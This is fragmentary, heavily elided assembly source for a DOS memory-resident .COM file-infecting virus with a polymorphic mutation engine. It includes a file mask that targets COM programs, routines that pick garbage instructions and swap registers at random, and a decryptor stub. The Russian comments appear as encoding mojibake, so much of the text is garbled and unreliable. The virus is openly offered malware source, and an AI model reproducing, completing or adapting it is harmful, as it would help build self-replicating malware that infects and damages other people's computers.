...
one     db      00h  ;\
	db      00h  ; \     
	db      00h  ;  \
	db      00h  ;   \___{ è«¼í¿¡áµ¿∩ ¬«¼¼á¡ñ ñ½∩ ºá/αáºΦ¿Σα«óΘ¿¬á
	db      00h  ;   /
	db      00h  ;  /
	db      00h  ; /
	db      00h  ;/
...
late:
	...
	Call	Mes
drop:
	Call	gkey  ;Åα«µÑñπαá úÑ¡Ñαáµ¿¿ 3-Ñσ ¬½ετÑ⌐ ¿ ºá¡ÑßÑ¡¿∩ ¿σ ó Γáí½¿µπ
	Lea	Si,one+[Bp]
	Mov     Ax,Dx
	Xor     Bx,Bx
	Call    rand
	...
	Push	Si
	Lea	Si,tabl+[Bp]
	Call	mreg    ; Åα«µÑñπαá ¿φ¼Ñ¡Ñ¡¿∩ íáº«óδσ αÑú¿ßΓα«ó ó Γáí½¿µÑ
	Pop	Si
...
mo:
	...
	Mov	Dx,24d
Cycle:
	Call	Comp	; âÑ¡Ñαáµ¿∩ »«ß½Ññ«óáΓÑ½∞¡«ßΓ¿ ¬«¼á¡ñ
	Inc	Si
	Add	Bx,0003h
	Sub	Dx,0003h
	Loop	Cycle
...
vir    DB "\???????.COM oooooooooooooooooooooooooooooooooooooooooooooooooΘoooooo"
...
vir    DB "\???????.COM oooooooooooooooooooooooooooooooooooooooooooooo   Θoooooo"
...
Decod  ENDP
	...
	Pop	Si
	Jmp	bep
vir    DB      "\???????.COM oooooooooooooooooooooooooooooooooooooooooooooo   Θooooooooooo
bep    PROC
	push    si
bep    ENDP
	add     si,56d 
...
Decod  ENDP
	...
	Pop     Si
	Jmp     bep
vir    DB      "\???????.COM oooooooooooooooooooooooooooooooooooooooooooooooooΘooooooooooo
bep    PROC
	push    si
bep    ENDP
	add     si,56d 
...
──────────────────────────────────────────────────────────────[RC_1440.ASM]───
; TSR com infector ß »«½¿¼«αΣ¿¬ úÑ¡ÑαáΓ«α«¼ [IDA] v_0.01.
...
;message                db      'ê φΓ« ÑΘ± ¡Ñ óß±... 1997ú'
D0lng           dw      0       ;
D_lng           dw      0       ; æ¼ÑΘÑ¡¿Ñ ¡á Mov ??,???? = 1
D_lng1          dw      0       ; æ¼ÑΘÑ¡¿Ñ ¡á Mov ??,???? = 2
D_lng2          dw      0       ; æ¼ÑΘÑ¡¿Ñ ¡á Cmp ??,????
D_last          dw      0       ; æ¼ÑΘÑ¡¿Ñ ¡á »«ß½Ññ¡¿⌐ íá⌐Γ CRYPT'á
...
gar:            Call    Get_rnd         ;
		...
		Jz      gar
		Mov     Cx,Di
		Mov     word ptr D0lng-100h-203d,Cx  ; ä½¿¡¡á 2
ag2:            Call    Get_rnd
		Mov     Ax,0025
		Call    Get_off
		Lea     Si,[Di]+one_b_op-100h-203d
